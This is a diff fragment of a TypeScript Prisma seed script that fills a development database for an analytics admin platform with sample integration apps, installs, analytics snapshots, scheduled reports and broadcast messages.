+        installCount: 34,
+        rating: 4.1,
+        reviewCount: 8,
+      },
+      {
+        name: 'Custom Webhook',
+        slug: 'custom-webhook',
+        description: 'Send GWI events to any webhook endpoint.',
+        shortDescription: 'Custom integrations',
+        category: 'DEVELOPER',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/webhook-logo.png',
+        status: 'PUBLISHED',
+        version: '1.0.0',
+        features: ['Custom events', 'Retry logic', 'HMAC signing'],
+        permissions: ['webhooks:send'],
+        isOfficial: true,
+        installCount: 567,
+        rating: 4.6,
+        reviewCount: 45,
+      },
+      {
+        name: 'AWS S3 Export',
+        slug: 'aws-s3',
+        description: 'Export GWI data directly to Amazon S3 buckets.',
+        shortDescription: 'Cloud storage export',
+        category: 'DATA_WAREHOUSE',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/s3-logo.png',
+        status: 'BETA',
+        version: '0.5.0',
+        features: ['Scheduled exports', 'Multiple formats', 'Cross-account access'],
+        permissions: ['read:*', 'write:exports'],
+        isOfficial: true,
+        installCount: 23,
+        rating: 4.2,
+        reviewCount: 5,
+      },
+      {
+        name: 'Looker Studio',
+        slug: 'looker-studio',
+        description: 'Google Looker Studio connector for GWI data.',
+        shortDescription: 'Data visualization',
+        category: 'ANALYTICS',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/looker-logo.png',
+        status: 'COMING_SOON',
+        version: '0.1.0',
+        features: ['Community connector', 'Custom dimensions'],
+        permissions: ['read:audiences', 'read:analytics'],
+        isOfficial: true,
+        installCount: 0,
+      },
+    ]
+  })
+
+  // ==================== INTEGRATION INSTALLS ====================
+  console.log('📦 Creating integration installs...')
+
+  await prisma.integrationInstall.createMany({
+    data: [
+      { appId: slackApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', config: { channel: '#gwi-insights', notifyOn: ['reports', 'insights'] }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 1 * 60 * 60 * 1000) },
+      { appId: slackApp.id, orgId: acmeCorp.id, status: 'ACTIVE', config: { channel: '#analytics', notifyOn: ['reports'] }, installedBy: adminUser.id, installedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
+      { appId: salesforceApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', config: { objectType: 'Contact', fieldMapping: { email: 'Email', segment: 'GWI_Segment__c' } }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 120 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 24 * 60 * 60 * 1000) },
+      { appId: tableauApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', config: { server: 'https://tableau.enterprise-co.com' }, installedBy: sarahEnterprise.id, installedAt: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000) },
+      { appId: tableauApp.id, orgId: acmeCorp.id, status: 'ACTIVE', config: { server: 'https://tableau.acme.com' }, installedBy: janeSmith.id, installedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
+      { appId: slackApp.id, orgId: techStartup.id, status: 'SUSPENDED', config: { channel: '#data' }, installedBy: bobWilson.id, installedAt: new Date(now.getTime() - 75 * 24 * 60 * 60 * 1000), suspendedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000), suspendReason: 'Slack workspace disconnected' },
+      { appId: salesforceApp.id, orgId: acmeCorp.id, status: 'ACTIVE', config: { objectType: 'Lead' }, installedBy: adminUser.id, installedAt: new Date(now.getTime() - 50 * 24 * 60 * 60 * 1000), lastUsed: new Date(now.getTime() - 48 * 60 * 60 * 1000) },
+    ]
+  })
+
+  // ==================== ANALYTICS SNAPSHOTS ====================
+  console.log('📈 Creating analytics snapshots...')
+
+  const analyticsSnapshots = []
+  for (let i = 0; i < 30; i++) {
+    const snapshotDate = new Date(now.getTime() - i * 24 * 60 * 60 * 1000)
+    const baseUsers = 2500 + Math.floor(Math.random() * 200) - 100
+    const baseOrgs = 156 + Math.floor(Math.random() * 10)
+
+    analyticsSnapshots.push({
+      snapshotDate,
+      period: 'DAILY',
+      metrics: {
+        totalUsers: baseUsers + i * 3,
+        activeUsers: Math.floor(baseUsers * 0.65) + Math.floor(Math.random() * 50),
+        newUsers: 15 + Math.floor(Math.random() * 10),
+        totalOrgs: baseOrgs,
+        activeOrgs: Math.floor(baseOrgs * 0.78),
+        newOrgs: Math.floor(Math.random() * 3),
+        totalAgentRuns: 45000 + Math.floor(Math.random() * 5000),
+        totalApiCalls: 1500000 + Math.floor(Math.random() * 200000),
+        totalDataExports: 890 + Math.floor(Math.random() * 100),
+        totalReportsGenerated: 2300 + Math.floor(Math.random() * 300),
+        avgSessionDuration: 25 + Math.random() * 10,
+        avgAgentRunTime: 12 + Math.random() * 5,
+      },
+      usersByPlan: { STARTER: 890, PROFESSIONAL: 1200, ENTERPRISE: baseUsers - 2090 },
+      usersByRegion: { 'North America': 1200, 'Europe': 800, 'Asia Pacific': 350, 'Other': 150 },
+      topFeatures: [
+        { feature: 'Audience Builder', usage: 45000 + Math.floor(Math.random() * 5000) },
+        { feature: 'Crosstab Analysis', usage: 38000 + Math.floor(Math.random() * 4000) },
+        { feature: 'AI Insights', usage: 28000 + Math.floor(Math.random() * 3000) },
+        { feature: 'Report Generator', usage: 22000 + Math.floor(Math.random() * 2500) },
+        { feature: 'Dashboard Builder', usage: 18000 + Math.floor(Math.random() * 2000) },
+      ],
+      errorRate: 0.02 + Math.random() * 0.01,
+      p99Latency: 180 + Math.floor(Math.random() * 50),
+    })
+  }
+
+  await prisma.analyticsSnapshot.createMany({ data: analyticsSnapshots })
+
+  // ==================== CUSTOM REPORTS ====================
+  console.log('📑 Creating custom reports...')
+
+  await prisma.customReport.createMany({
+    data: [
+      {
+        name: 'Monthly Executive Summary',
+        description: 'High-level platform metrics for executive review',
+        type: 'SCHEDULED',
+        schedule: '0 9 1 * *',
+        config: {
+          metrics: ['totalUsers', 'activeUsers', 'revenue', 'churnRate'],
+          groupBy: 'plan',
+          dateRange: 'last_30_days',
+          format: 'pdf',
+        },
+        recipients: ['executives@gwi.com', 'leadership@gwi.com'],
+        lastRunAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
+        nextRunAt: new Date(now.getTime() + 17 * 24 * 60 * 60 * 1000),
+        status: 'ACTIVE',
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        name: 'Weekly Churn Analysis',
+        description: 'Detailed analysis of at-risk accounts and churn indicators',
+        type: 'SCHEDULED',
+        schedule: '0 8 * * 1',
+        config: {
+          metrics: ['churnProbability', 'healthScore', 'lastActivity'],
+          filters: { riskLevel: ['AT_RISK', 'CRITICAL'] },
+          format: 'xlsx',
+        },
+        recipients: ['customer-success@gwi.com'],
+        lastRunAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        nextRunAt: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
+        status: 'ACTIVE',
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        name: 'Security Incident Report',
+        description: 'Summary of security events and policy violations',
+        type: 'SCHEDULED',
+        schedule: '0 6 * * *',
+        config: {
+          metrics: ['securityViolations', 'threatEvents', 'blockedIPs'],
+          severity: ['HIGH', 'CRITICAL'],
+          format: 'pdf',
+        },
+        recipients: ['security@gwi.com', 'compliance@gwi.com'],
+        lastRunAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        nextRunAt: new Date(now.getTime() + 6 * 60 * 60 * 1000),
+        status: 'ACTIVE',
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        name: 'API Usage Dashboard',
+        description: 'Real-time API usage metrics and trends',
+        type: 'REALTIME',
+        config: {
+          metrics: ['apiCalls', 'errorRate', 'latency', 'activeClients'],
+          refreshInterval: 60,
+          alerts: { errorRate: 0.05, latency: 500 },
+        },
+        status: 'ACTIVE',
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        name: 'Compliance Audit Summary',
+        description: 'Monthly compliance status across all frameworks',
+        type: 'SCHEDULED',
+        schedule: '0 10 1 * *',
+        config: {
+          frameworks: ['SOC2', 'GDPR', 'HIPAA', 'ISO27001'],
+          includeEvidence: true,
+          format: 'pdf',
+        },
+        recipients: ['compliance@gwi.com', 'legal@gwi.com'],
+        lastRunAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
+        nextRunAt: new Date(now.getTime() + 17 * 24 * 60 * 60 * 1000),
+        status: 'ACTIVE',
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        name: 'Feature Adoption Report',
+        description: 'Analysis of feature usage and adoption trends',
+        type: 'ON_DEMAND',
+        config: {
+          metrics: ['featureUsage', 'adoptionRate', 'userSegments'],
+          comparison: 'month_over_month',
+          format: 'xlsx',
+        },
+        lastRunAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        status: 'ACTIVE',
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        name: 'Revenue Analytics',
+        description: 'Detailed revenue breakdown by plan and region',
+        type: 'SCHEDULED',
+        schedule: '0 7 * * 1',
+        config: {
+          metrics: ['mrr', 'arr', 'expansion', 'contraction'],
+          groupBy: ['plan', 'region'],
+          format: 'pdf',
+        },
+        recipients: ['finance@gwi.com'],
+        lastRunAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        nextRunAt: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
+        status: 'ACTIVE',
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        name: 'Deprecated Report',
+        description: 'Old report format - no longer in use',
+        type: 'SCHEDULED',
+        schedule: '0 0 1 * *',
+        config: { legacy: true },
+        status: 'DISABLED',
+        createdBy: platformAdmin?.id || 'system',
+      },
+    ]
+  })
+
+  // ==================== BROADCAST MESSAGES ====================
+  console.log('📢 Creating broadcast messages...')
+
+  await prisma.broadcastMessage.createMany({
+    data: [
+      {
+        title: 'Platform Update: Version 2.5.0 Released',
+        content: 'We are excited to announce the release of version 2.5.0, featuring new Security Center capabilities, compliance framework tracking, and significant performance improvements. Check out the changelog for full details.',
+        type: 'ANNOUNCEMENT',
+        priority: 'NORMAL',
+        status: 'PUBLISHED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP', 'EMAIL'],
+        publishedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 23 * 24 * 60 * 60 * 1000),
+        createdBy: superAdmin?.id || 'system',
+        stats: { views: 2345, clicks: 567, dismissals: 123 },
+      },
+      {
+        title: 'Scheduled Maintenance: Database Upgrade',
+        content: 'We will be performing scheduled maintenance on January 18th from 2:00 AM to 6:00 AM UTC. During this time, the platform will be unavailable. Please plan accordingly.',
+        type: 'MAINTENANCE',
+        priority: 'HIGH',
+        status: 'SCHEDULED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP', 'EMAIL', 'SMS'],
+        scheduledFor: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        title: 'Security Alert: Phishing Campaign Detected',
+        content: 'We have detected a phishing campaign targeting GWI users. Please be vigilant and do not click on suspicious links. Always verify the sender before entering credentials. Report suspicious emails to security@gwi.com.',
+        type: 'ALERT',
+        priority: 'URGENT',
+        status: 'PUBLISHED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP', 'EMAIL'],
+        publishedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
+        createdBy: superAdmin?.id || 'system',
+        stats: { views: 1890, clicks: 234, dismissals: 45 },
+      },
+      {
+        title: 'New Feature: AI Insights V2 Now Available',
+        content: 'AI Insights V2 is now available for Professional and Enterprise plans! Experience deeper analysis, trend predictions, and automated recommendations. Enable it in your account settings.',
+        type: 'FEATURE',
+        priority: 'NORMAL',
+        status: 'PUBLISHED',
+        targetAudience: 'PLAN',
+        targetPlans: ['PROFESSIONAL', 'ENTERPRISE'],
+        channels: ['IN_APP'],
+        publishedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 16 * 24 * 60 * 60 * 1000),
+        createdBy: platformAdmin?.id || 'system',
+        stats: { views: 890, clicks: 345, dismissals: 67 },
+      },
+      {
+        title: 'Special Offer: 20% Off Enterprise Plan',
+        content: 'For a limited time, upgrade to Enterprise and get 20% off your first year. Unlock SSO, advanced permissions, unlimited API access, and priority support. Contact sales to learn more.',
+        type: 'PROMOTION',
+        priority: 'NORMAL',
+        status: 'PUBLISHED',
+        targetAudience: 'PLAN',
+        targetPlans: ['STARTER', 'PROFESSIONAL'],
+        channels: ['IN_APP', 'EMAIL'],
+        publishedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 20 * 24 * 60 * 60 * 1000),
+        createdBy: platformAdmin?.id || 'system',
+        stats: { views: 1234, clicks: 189, dismissals: 456 },
+      },
+      {
+        title: 'API Deprecation Notice: v1 Endpoints',
+        content: 'API v1 endpoints will be deprecated on March 1st, 2025. Please migrate to v2 API. Comprehensive migration guides are available in our documentation.',
+        type: 'WARNING',
+        priority: 'HIGH',
+        status: 'PUBLISHED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP', 'EMAIL'],
+        publishedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date('2025-03-01'),
+        createdBy: superAdmin?.id || 'system',
+        stats: { views: 3456, clicks: 789, dismissals: 234 },
+      },
+      {
+        title: 'Webinar: Getting the Most Out of GWI',
+        content: 'Join us for a live webinar on advanced GWI features. Learn tips and tricks from our product experts. Register now!',
+        type: 'ANNOUNCEMENT',
+        priority: 'LOW',
+        status: 'PUBLISHED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP'],
+        publishedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 4 * 24 * 60 * 60 * 1000),
+        actionUrl: 'https://gwi.com/webinars/advanced-features',
+        actionText: 'Register Now',
+        createdBy: platformAdmin?.id || 'system',
+        stats: { views: 567, clicks: 123, dismissals: 89 },
+      },
+      {
+        title: 'System Performance Improvement',
+        content: 'We have completed infrastructure upgrades that improve platform performance by up to 40%. Enjoy faster load times and improved reliability.',
+        type: 'ANNOUNCEMENT',
+        priority: 'NORMAL',
+        status: 'PUBLISHED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP'],
+        publishedAt: new Date(now.getTime() - 21 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        createdBy: superAdmin?.id || 'system',
+        stats: { views: 4567, clicks: 0, dismissals: 890 },
+      },
+      {
+        title: 'Draft: Q1 Product Updates',
+        content: 'Preview of upcoming Q1 product updates including new dashboard features and enhanced reporting capabilities.',
+        type: 'ANNOUNCEMENT',
+        priority: 'NORMAL',
+        status: 'DRAFT',
+        targetAudience: 'ALL',
+        channels: ['IN_APP', 'EMAIL'],
+        createdBy: platformAdmin?.id || 'system',
+      },
+      {
+        title: 'Enterprise SSO Maintenance',
+        content: 'Enterprise SSO will undergo brief maintenance on January 20th at 3:00 AM UTC. Users may need to re-authenticate after maintenance.',
+        type: 'MAINTENANCE',
+        priority: 'NORMAL',
+        status: 'SCHEDULED',
+        targetAudience: 'PLAN',
+        targetPlans: ['ENTERPRISE'],
+        channels: ['IN_APP', 'EMAIL'],
+        scheduledFor: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() + 8 * 24 * 60 * 60 * 1000),
+        createdBy: superAdmin?.id || 'system',
+      },
+      {
+        title: 'Holiday Support Hours',
+        content: 'Please note that support hours will be limited during the holiday period. Emergency support remains available 24/7.',
+        type: 'ANNOUNCEMENT',
+        priority: 'LOW',
+        status: 'EXPIRED',
+        targetAudience: 'ALL',
+        channels: ['IN_APP'],
+        publishedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
+        createdBy: platformAdmin?.id || 'system',
+        stats: { views: 2345, clicks: 0, dismissals: 567 },
+      },
+    ]
+  })
+
   console.log('\n📊 Summary:')
   console.log('   Organizations: 6')
   console.log('   Users: 12')
@@ -5175,6 +7939,36 @@ async function main() {
   console.log('   System Config: 8')
   console.log('   User Bans: 3')
   console.log('   Organization Suspensions: 3')
+  console.log('')
+  console.log('   === New Admin Modules ===')
+  console.log('   Security Policies: 8')
+  console.log('   Security Violations: 15')
+  console.log('   Threat Events: 12')
+  console.log('   IP Blocklist: 7')
+  console.log('   Compliance Frameworks: 5 (SOC2, HIPAA, GDPR, ISO27001, PCI-DSS)')
+  console.log('   Compliance Attestations: 6')
+  console.log('   Compliance Audits: 5')
+  console.log('   Legal Holds: 4')
+  console.log('   Data Exports: 7')
+  console.log('   Data Retention Policies: 6')
+  console.log('   Platform Incidents: 6')
+  console.log('   Incident Updates: 11')
+  console.log('   Maintenance Windows: 5')
+  console.log('   Release Management: 6')
+  console.log('   Capacity Metrics: 19')
+  console.log('   Domain Verifications: 6')
+  console.log('   Enterprise SSO Configs: 4')
+  console.log('   SCIM Integrations: 3')
+  console.log('   Device Policies: 4')
+  console.log('   Trusted Devices: 10')
+  console.log('   API Clients: 8')
+  console.log('   Webhook Endpoints: 7')
+  console.log('   Webhook Deliveries: 10')
+  console.log('   Integration Apps: 14')
+  console.log('   Integration Installs: 7')
+  console.log('   Analytics Snapshots: 30 (daily for last 30 days)')
+  console.log('   Custom Reports: 8')
+  console.log('   Broadcast Messages: 11')
 
   console.log('\n🔑 Test Credentials:')
   console.log('')
